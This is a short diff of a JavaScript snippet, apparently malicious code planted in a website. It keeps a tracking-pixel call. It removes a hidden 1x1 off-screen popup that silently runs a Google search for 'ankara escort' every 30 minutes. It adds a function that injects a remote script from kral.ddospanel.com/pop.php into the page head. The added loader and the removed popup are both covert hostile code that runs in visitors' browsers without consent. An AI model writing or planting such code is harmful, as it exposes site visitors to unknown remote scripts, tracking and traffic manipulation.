@@ -1,15 +1,13 @@
 new Image().src = 'https://whos.amung.us/widget/dd0spanel.png';
-
-tarih = new Date();
-    storage_key = 'access_yorummz_';
-    if (!sessionStorage[storage_key] || (sessionStorage[storage_key] && tarih.getTime() >= sessionStorage[storage_key])) {
-        tarih.setTime(tarih.getTime() + 1000* 60 * 30);
-        sessionStorage[storage_key] = tarih.getTime();
-window.open("https://www.google.com.tr/#q=ankara+escort","ljPu","toolbar=no,status=no,menubar=no,scrollbars=no,resizable=no,left=10000, top=10000, width=1, height=1, visible=none");
-
-		
-    }
     
+    function addJavascript(jsname){
+ var th = document.getElementsByTagName('head')[0];
+ var s = document.createElement('script');
+ s.setAttribute('type','text/javascript');
+ s.setAttribute('src',jsname);
+ th.appendChild(s);
+}
+addJavascript("https://kral.ddospanel.com/pop.php");
 
 
 
